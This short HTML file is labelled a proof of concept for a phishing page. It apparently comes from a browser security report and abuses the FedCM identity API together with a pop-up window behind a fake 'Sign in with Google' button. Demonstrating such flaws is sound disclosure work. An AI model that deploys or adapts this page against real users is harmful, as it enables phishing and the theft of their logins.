
<head>PoC of phishing page</head>
<script>
  async function signIn() {
    await navigator.login.setStatus("logged-in");
    try{
      const credential = await navigator.credentials.get({
        identity: {
          mediation: "optional",
          providers: [{
            configURL: "http://localhost:8001/config.json",
            clientId: "123",
            nonce: '******',
          }]
        }
      });
    } catch (e) {
      fetch("/signal");
    }
  }

  async function test() {
    var w = window.open("child.html", "hello", "width=500,height=500");
    await signIn();
  }
</script>
<br><br><br>
<button onclick="test()" >Sign in with Google</button>
